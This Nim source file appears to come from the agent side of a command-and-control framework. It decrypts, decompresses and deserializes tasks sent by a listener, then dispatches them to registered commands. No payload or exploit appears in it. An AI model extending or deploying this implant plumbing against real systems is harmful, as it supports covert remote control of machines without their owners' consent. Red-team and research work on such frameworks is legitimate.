import zippy, strformat, tables
import ./result
import ../utils/io
import ../core/command
import ../../../common/[serialize, sequence, crypto, utils]
import ../../../types/[common, agent, protocol]

proc handleTask*(ctx: AgentCtx, task: Task): TaskResult = 
    try: 
        return commands[cast[CommandType](task.command)](ctx, task)
    except CatchableError as err: 
        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

proc deserializeTask*(ctx: AgentCtx, bytes: seq[byte]): Task = 
    var unpacker = Unpacker.init(Bytes.toString(bytes))

    let header = unpacker.deserializeHeader()

    # Packet Validation
    validatePacket(header, cast[uint8](MSG_TASK)) 

    # Decrypt payload 
    let compressedPayload = unpacker.getBytes(int(header.size))
    let decData = validateDecryption(ctx.sessionKey, header.iv, compressedPayload, header.seqNr, header)

    # Decompress payload 
    let payload = uncompress(decData, dfGzip)

    # Deserialize decrypted data
    unpacker = Unpacker.init(Bytes.toString(payload))

    let 
        taskId = unpacker.getUint32()
        listenerId = unpacker.getUint32()
        timestamp = unpacker.getUint32()
        command = unpacker.getUint16()
    
    var argCount = unpacker.getUint8()
    var args = newSeq[TaskArg]() 

    # Parse arguments
    var i = 0
    while i < int(argCount): 
        args.add(unpacker.getArgument())
        inc i

    return Task(
        header: header,
        taskId: taskId,
        listenerId: listenerId, 
        timestamp: timestamp,
        command: command,
        argCount: argCount,
        args: args
    )

proc deserializePacket*(ctx: AgentCtx, packet: string): Table[string, seq[seq[byte]]] = 
    result = initTable[string, seq[seq[byte]]]()
    var unpacker = Unpacker.init(packet) 

    while unpacker.canRead(): 
        let agentId = Uuid.toString(unpacker.getUint32())
        if agentId notin result:
            result[agentId] = newSeq[seq[byte]]()
    
        let taskCount = unpacker.getUint8()

        print fmt"[*] Response contained {taskCount} tasks for agent {agentId}."
        if taskCount <= 0: 
            continue

        for i in 0 ..< int(taskCount): 
            # Read length of each task and store the task object in a seq[byte]
            let taskLength = unpacker.getUint32() 
            let taskBytes = unpacker.getBytes(int(taskLength))

            result[agentId].add(taskBytes)
